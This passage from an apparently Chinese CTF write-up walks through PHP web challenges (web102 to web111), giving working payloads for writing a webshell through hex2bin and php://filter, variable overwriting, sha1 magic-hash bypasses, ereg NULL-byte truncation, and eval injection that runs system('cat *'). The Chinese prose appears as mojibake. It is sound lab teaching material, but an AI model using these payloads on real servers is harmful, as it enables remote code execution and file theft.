important">?></span></span> </code></pre><p>**substr() **:å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</p><p>**call_user_func()**ï¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ä½¿ç”¨ï¼Œåé¢çš„å‚æ•°æ˜¯è¿™ä¸ªå‡½æ•°çš„å‚æ•°ã€‚è¿”å›è°ƒç”¨å‡½æ•°çš„è¿”å›å€¼ã€‚å…¶å®å°±æ˜¯ä¸€ç§ç‰¹æ®Šçš„è°ƒç”¨å‡½æ•°çš„æ–¹å¼ã€‚</p><p><strong>php5</strong>ä¸‹is_numericå¯è¯†åˆ«16è¿›åˆ¶ï¼Œå¦‚0x2eï¼Œç„¶åè°ƒç”¨hex2binè½¬æˆå­—ç¬¦ä¸²å†™å…¥æœ¨é©¬ï¼Œä½†é¢˜ç›®ç¯å¢ƒæ²¡é…å¥½ï¼Œæ˜¯<strong>php7</strong>,æ‰€ä»¥è¦å¦æ¢æ–¹æ³•ã€‚<br>ç”¨ä¼ªåè®®å†™å…¥ï¼Œæ‰€ä»¥éœ€è¦base64ç¼–ç åè½¬æˆ16è¿›åˆ¶å…¨æ˜¯æ•°å­—çš„å­—ç¬¦ä¸²</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?=`cat *`;'</span><span class="token punctuation">;</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$a=PD89YGNhdCAqYDs=</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PD89YGNhdCAqYDs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> å¾—åˆ°5044383959474e6864434171594473</code></pre><p><strong>PHPçŸ­æ ‡ç­¾</strong></p><?=(è¡¨è¾¾å¼)?><p>ç­‰ä»·äº<?php echo (è¡¨è¾¾å¼)?></p><p>Payload:</p><blockquote><p>GET:?v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p><p>POST:v1&#x3D;hex2bin</p></blockquote><h4 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*p.*h.*p.*/i"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sorry'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åŠ äº†ä¸ªé¸¡è‚‹çš„é™åˆ¶ï¼Œå› ä¸ºæœ¬æ¥å°±æ˜¯ç”¨base64åŠ å¯†åçš„ï¼Œæ‰€ä»¥æ²¡ä»€ä¹ˆå½±å“</p><h4 id="web104-sha1"><a href="#web104-sha1" class="headerlink" title="web104(sha1)"></a>web104(sha1)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>shalå‡½æ•°å°±æ˜¯è®¡ç®—æ•£åˆ—å‡½æ•°ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªä¸å¯é€†çš„åŠ å¯†å‡½æ•°ï¼Œè¿™é¢˜æ²¡å•¥è¿‡æ»¤ï¼Œç›´æ¥ä¼ ä¸¤ä¸ªç›¸åŒçš„å‚æ•°å°±å¥½äº†ï¼Œæ„é€ payload</p><p>æˆ–è€…ä½¿ç”¨æ•°ç»„ä¹Ÿå¯ä»¥ç»•è¿‡</p><p>å€¼çš„åˆ¤æ–­æ˜¯ä½¿ç”¨ <code>==</code>ï¼Œæ‰€ä»¥æ‰¾åŠ å¯†å 0e å¼€å¤´çš„ä¸¤ä¸ªå€¼ä¹Ÿå¯ä»¥ã€‚</p><p>aaK1STfY -&gt; 0e76658526655756207688271159624026011393</p><p>aaO8zKZF -&gt; 0e89257456677279068558073954252716165668</p><h4 id="web105-phpå˜é‡è¦†ç›–"><a href="#web105-phpå˜é‡è¦†ç›–" class="headerlink" title="web105(phpå˜é‡è¦†ç›–)"></a>web105(phpå˜é‡è¦†ç›–)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><ul><li><p>æœ¬é¢˜è€ƒæŸ¥å˜é‡è¦†ç›–å’Œ<code>die()</code>çš„çŸ¥è¯†</p></li><li><p><code>$$a = $$b</code>å¯ä»¥ç±»ä¼¼äºï¼Œå°†$açš„åœ°å€æŒ‡å‘$b</p><p>æ‰€ä»¥æ— è®º$bæ€ä¹ˆæ”¹å˜å€¼ï¼Œ$açš„å€¼éƒ½ä¼šå’Œ$bä¸€æ ·</p></li><li><p><code>die()</code>å‡½æ•°è™½ç„¶ä¼šç»ˆæ­¢ç¨‹åºï¼Œä½†åŒæ—¶ä¹Ÿä¼šè¾“å‡ºæ‹¬å·å†…çš„ç»ˆæ­¢æç¤ºä¿¡æ¯</p></li><li><p>æœ¬é¢˜åˆ©ç”¨å˜é‡è¦†ç›–å’Œ<code>die()</code>å‡½æ•°çš„ç‰¹æ€§</p><ol><li>å…ˆå¯¹getçš„å†…å®¹è¿›è¡Œè¦†ç›–ï¼Œä¸”ä¸èƒ½è¦†ç›–errorï¼Œæ‰€ä»¥è¦è¦†ç›–sucesï¼Œå³?suces&#x3D;flagï¼Œæ­¤æ—¶suces&#x3D;&gt;flagçš„åœ°å€</li><li>å†å¯¹postçš„å†…å®¹è¿›è¡Œè¦†ç›–ï¼Œä¸”ä¸èƒ½å°†flagç›´æ¥è¦†ç›–ï¼Œæ‰€ä»¥åªèƒ½error&#x3D;sucesï¼Œæ­¤æ—¶error&#x3D;&gt;flagçš„åœ°å€</li><li>æ­¤æ—¶æ— è®ºè¿›å…¥å“ªä¸ª<code>die()</code>å‡½æ•°ï¼Œéƒ½å¯ä»¥è¾“å‡º<code>$flag</code>çš„å€¼</li></ol></li></ul><p>Payload:</p><blockquote><p>GET:?suces&#x3D;flag</p><p>POST:error&#x3D;suces</p></blockquote><h4 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$v1</span><span class="token operator">!=</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>åŠ äº†é™åˆ¶ï¼ŒPayloadåŒ104</p><h4 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107(parse_str)"></a>web107(parse_str)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p><strong>parse_str</strong>($v1,$v2); &#x2F;&#x2F;æŠŠv1çš„å€¼ç›¸åº”çš„æ¢æˆé”®å€¼å¯¹å†å­˜å…¥v2(æ•°ç»„)<br>v1&#x3D;flag&#x3D;114&amp;index&#x3D;300çš„è¯ï¼Œ<br>v2å°±å˜æˆä¸€ä¸ªæ•°ç»„ï¼Œå†…å®¹ä¸ºflagâ€“&gt;114      indexâ€“&gt;300ï¼ˆåˆ†ä¸ºè¿™ä¸¤ä¸ªé”®å€¼å¯¹ï¼‰</p><p>æ‰€ä»¥åªéœ€è¦è®©ä¼ å…¥çš„flag md5å€¼ä¸v3ä¸€æ ·å°±å¯</p><p>Payload:</p><blockquote><p>POST:v1&#x3D;flag&#x3D;47bce5c74f589f4867dbd57e9ca9f808</p><p>GET:?v3&#x3D;aaa</p></blockquote><h4 id="we108-ereg-NULLæˆªæ–­æ¼æ´"><a href="#we108-ereg-NULLæˆªæ–­æ¼æ´" class="headerlink" title="we108(ereg NULLæˆªæ–­æ¼æ´)"></a>we108(ereg NULLæˆªæ–­æ¼æ´)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>ereg (â€œ^[a-zA-Z]+$â€, $_GET[â€˜câ€™])&#x3D;&#x3D;&#x3D;FALSE</p><p>ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­— æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚</p><p>ç»“åˆereg()å‡½æ•°ç”¨æ³•ï¼Œæœç´¢ä¸åˆ°æŒ‡å®šå­—ç¬¦ä¸²å°±ä¼šè¿”å›FALSE</p><p>æ‰€ä»¥è¦è®©cä¸­æœ‰å­—æ¯ï¼Œä½†ä¸èƒ½å‡ºç°å…¶ä»–ä¸œè¥¿</p><p>ereg å‡½æ•°å­˜åœ¨ NULL æˆªæ–­æ¼æ´ï¼Œå¯ä»¥ç»•è¿‡æ­£åˆ™è¿‡æ»¤ï¼Œä½¿ç”¨ %00 æˆªæ–­ã€‚</p><p>0x36dï¼Œè½¬åè¿›åˆ¶æ˜¯877ã€‚</p><p>Payload:<code>c=a%00778</code></p><h4 id="web109-phpå†…ç½®ç±»çš„ä½¿ç”¨"><a href="#web109-phpå†…ç½®ç±»çš„ä½¿ç”¨" class="headerlink" title="web109(phpå†…ç½®ç±»çš„ä½¿ç”¨)"></a>web109(phpå†…ç½®ç±»çš„ä½¿ç”¨)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>çœ‹åˆ°echo newå°è¯•åå°„ç±»</p><p>Payloadï¼š</p><blockquote><p>?v1&#x3D;Reflectionclass&amp;v2&#x3D;system(â€˜tac fl36dg.txtâ€™)</p><p>?v1&#x3D;Exception&amp;v2&#x3D;system(â€˜cat *â€™)  å¼‚å¸¸å¤„ç†</p><p>?v1&#x3D;class{ public function __construct(){ system(â€˜lsâ€™); } };&amp;v2&#x3D;a  ç”¨åŒ¿åç±»ç»•è¿‡ </p></blockquote><p>v1&#x3D;å†…ç½®ç±»&amp;v2&#x3D;system(â€˜lsâ€™)å³å¯ phpä¸­ä¼šå…ˆæ‰§è¡Œlså‘½ä»¤ç„¶åæŠŠç»“æœä½œä¸ºå‚æ•°å†æ‰§è¡Œä½†lsçš„ç»“æœå·²ç»è¢«è¾“å‡ºäº†</p><h4 id="web110-FilesystemIterator-class"><a href="#web110-FilesystemIterator-class" class="headerlink" title="web110(FilesystemIterator class)"></a>web110(FilesystemIterator class)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>[The FilesystemIterator class](<a href="https://www.php.net/manual/zh/class.filesystemiterator.php">PHP: FilesystemIterator - Manual</a>)</p><p>phpå†…ç½®ç±» åˆ©ç”¨ FilesystemIterator è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p><p>Payload:<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p><h4 id="web111-GLOBALS"><a href="#web111-GLOBALS" class="headerlink" title="web111(GLOBALS)"></a>web111(GLOBALS)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$$v1</span></span> = &amp;<span class="token interpolation"><span class="token variable">$$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>æ³¨æ„ PHP çš„å‡½æ•°å…·æœ‰è¯æ³•ä½œç”¨åŸŸ</p><p>åœ¨å‡½æ•°å†…éƒ¨æ— æ³•è°ƒç”¨å¤–éƒ¨çš„å˜é‡ï¼Œé™¤éè¿›è¡Œä¼ å‚ã€‚è¿™é“é¢˜æ— éæ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ol><li>æˆ‘ä»¬æœ€ç»ˆè¦å¾—åˆ° $flag çš„å€¼ï¼Œå°±éœ€è¦ var_dump($$v1) ä¸­çš„ $v1 ä¸º flagï¼Œå³ $v2 è¦ä¸º flagï¼Œè¿™æ · $$v2 å°±ä¸º $flagï¼Œ&amp;$$v2 å°±ä¸º $flag å¯¹åº”çš„å€¼</li><li>URL ä¼ å‚æ—¶ $v2 ä¸èƒ½ç›´æ¥ä¼ ä¸º flagï¼Œå¦åˆ™ $flag ä¼šå› â€œå‡½æ•°å†…éƒ¨æ— æ³•è°ƒç”¨å¤–éƒ¨å˜é‡â€çš„é™åˆ¶è€Œå¯¼è‡´å…¶è¿”å› null</li><li>è¦æƒ³è·¨è¿‡è¯æ³•ä½œç”¨åŸŸçš„é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ GLOBALS 